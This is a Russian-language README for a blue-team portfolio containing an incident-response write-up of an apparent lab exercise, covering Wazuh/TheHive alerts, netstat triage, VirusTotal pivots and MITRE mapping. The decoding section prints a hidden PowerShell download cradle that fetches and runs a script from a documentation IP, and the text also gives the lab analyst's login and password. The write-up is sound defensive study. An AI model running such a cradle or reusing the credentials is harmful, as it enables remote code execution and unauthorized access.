# Blue Team Defense

Практические проекты по защите инфраструктуры: мониторинг, анализ инцидентов, обнаружение атак.

## Структура

- `siem-detection/` — правила детектирования, корреляция событий в SIEM
- `log-analysis/` — анализ системных и сетевых журналов (Windows Event Logs, сетевые логи)
- `incident-response/` — плайбуки и сценарии реагирования на инциденты
- `network-monitoring/` — анализ сетевого трафика, поиск аномалий
- `threat-hunting/` — проактивный поиск индикаторов компрометации

## Стек и инструменты

Splunk, Wireshark, Sysmon, Windows Event Viewer, Python/PowerShell для автоматизации анализа.

## Статус

Файлы и материалы будут добавляться по мере выполнения новых проектов.

---

## Кейс: InsightNexus — Admin Login via ManageEngine Web Console

**Автор:** Albedo0x
**Категория:** Incident Handling / Blue Team
**Инструменты:** TheHive, Wazuh, VirusTotal, MITRE ATT&CK, Bash (grep, base64)

### Обзор

Разбор инцидента на основе алерта `[InsightNexus] Admin Login via ManageEngine Web Console`, зафиксированного в **TheHive** (источник — **Wazuh**). Расследование включает выявление подозрительного внешнего IP из вывода `netstat`, репутационную проверку в **VirusTotal**, сопоставление с техниками **MITRE ATT&CK**, а также анализ логов с декодированием обфусцированной PowerShell-команды.

### Окружение

- Кейс-менеджмент / SIEM: TheHive (`http://STMIP:9000`)
- Источник логов: Wazuh (`wazuh_alert`)
- Учётные данные: `htb-analyst` / `P3n#31337@LOG`
- Проверка репутации: [VirusTotal](https://virustotal.com)

### Шаг 1. Внешний IP и пивот через VirusTotal

**Алерт:** `[InsightNexus] Admin Login via ManageEngine Web Console`
**Референс:** `INX-ALERT-2025-00077`
**Severity:** High | **TLP:** Amber | **PAP:** Amber
**MITRE-теги:** `T1078.001` (Valid Accounts), Initial Access

Wazuh зафиксировал успешный вход администратора в ManageEngine ADManager Plus с внешнего IP `103.112.60.117`. Вход произошёл за пределами ожидаемой геолокации и, возможно, указывает на компрометацию учётных данных. После входа зафиксирована активность по перечислению каталогов (directory enumeration).

В комментарии к алерту приведён вывод `netstat -ano`, снятый на том же хосте спустя ~15 минут после повторного присоединения к домену:

```
Proto  Local Address        Foreign Address     State        PID
TCP    127.0.0.1:5357       0.0.0.0:0           LISTENING    928
TCP    10.10.5.23:139       0.0.0.0:0           LISTENING    4
TCP    10.10.5.23:52344     198.51.100.24:443   ESTABLISHED  5420
TCP    10.10.5.23:52345     203.0.113.18:4444   ESTABLISHED  1340
UDP    10.10.5.23:123       *:*                              1320
TCP    10.10.5.23:49678     10.10.5.17:445      ESTABLISHED  5420
TCP    10.10.5.23:49679     10.10.5.18:445      TIME_WAIT    5420
```

Среди внутренних адресов `10.10.5.x` выделяются два внешних:

- `203.0.113.18:4444` — нестандартный высокий порт, типичный для C2-листенера.
- `198.51.100.24:443` — маскируется под HTTPS-трафик.

Поиск `203.0.113.18` в VirusTotal и переход на вкладку **Relations** → **Files Referring**, отфильтрованный по дате `2025-01-30`, показывает исполняемый файл (Win32 EXE, 34/72 детектов), имя которого начинается на **"Mango"**.

> Ответ на вопрос "как называется файл, начинающийся с 'Mango'" зафиксирован в комментарии к алерту `INX-ALERT-2025-00077` в TheHive (ответ скрыт в материалах задания и не приводится в открытом виде).

### Шаг 2. Whois для 198.51.100.24

Второй внешний IP из того же комментария — `198.51.100.24:443`. Поиск в VirusTotal → вкладка **Details** → **Whois Lookup**:

```
OrgName:    Internet Assigned Numbers Authority
Address:    12025 Waterfront Drive, Suite 300
StateProv:  CA
PostalCode: 90292
Country:    US
```

*(`198.51.100.x`, `203.0.113.x`, `192.0.2.x` — зарезервированные IANA-адреса для документации по RFC 5737; ожидаемо для лабораторной среды.)*

> Название города из поля `City` в Whois Lookup — ответ скрыт в материалах задания.

### Шаг 3. Техника MITRE для передачи инструментов через C2

Загрузка вредоносным ПО файлов с C2-сервера в сеть жертвы соответствует технике MITRE ATT&CK **Ingress Tool Transfer** — `T1105`.

### Шаг 4. TheHive — правило 92153 / VaultCli.dll

Алерт `Suspicious process loaded VaultCli.dll module. Possible use to dump stored passwords.` (референс `8ce7bd`, Severity Medium) содержит:

```
rule.level:           10
rule.id:              92153
rule.mitre.tactic:     ['Credential Access']
rule.mitre.technique:  ['Credentials from Password Stores']
```

`VaultCli.dll` связан с доступом к Windows Credential Manager/Vault — характерное поведение для дампа сохранённых паролей.

> Значение `rule.mitre.id` (формат `T1***`) скрыто в материалах задания.

### Шаг 5–6. Декодирование PowerShell-команды из logs-wazuh.zip

```bash
wget https://academy.hackthebox.com/storage/modules/148/logs-wazuh.zip
unzip logs-wazuh.zip
grep -A5 powershell logs-wazuh.json
```

В логах обнаружена команда с `-EncodedCommand` (Base64), запущенная от `services.exe`:

```bash
echo -n "<encoded_command>" | base64 -d
```

Декодированный результат:

```powershell
IEX (New-Object System.Net.WebClient).DownloadString('http://198.51.100.24/defender/deploy-definitions.ps1');
Start-Process powershell -ArgumentList '-NoProfile -WindowStyle Hidden -File C:\Windows\Temp\deploy-definitions.ps1'
```

Это классический download cradle: скрытый процесс PowerShell без профиля загружает второй этап (`deploy-definitions.ps1`, маскируется под файл Defender) с адреса `198.51.100.24` и исполняет его из `C:\Windows\Temp`.

> IP-адрес, использованный в команде: см. значение выше (`198.51.100.24`). Пользователь, от имени которого выполнена команда (`domain\user`) — скрыт в материалах задания.

### Выводы

- Сопоставление комментариев SIEM-алертов (вывод `netstat`) с threat-intel платформами (VirusTotal) быстро отделяет внутреннее латеральное движение от внешних C2-каналов.
- `198.51.100.x` / `203.0.113.x` / `192.0.2.x` — документационные диапазоны IANA; полезно сверяться с RFC 5737 перед тем, как считать адрес реальной инфраструктурой.
- Загрузка `VaultCli.dll` нетипичным процессом — сильный индикатор **Credential Access** (`T1555` — Credentials from Password Stores).
- Обфусцированные через Base64 `-EncodedCommand` PowerShell-вызовы — распространённая техника для staging download cradle (`IEX` + `DownloadString`); всегда декодировать перед анализом.
- Привязка наблюдаемого поведения к MITRE ATT&CK ID (`T1078.001`, `T1105`, `T1555`) делает документацию инцидентов последовательной и удобной для поиска между кейсами.

---
*Разбор подготовлен Albedo0x в рамках практики Blue Team / Incident Handling.*
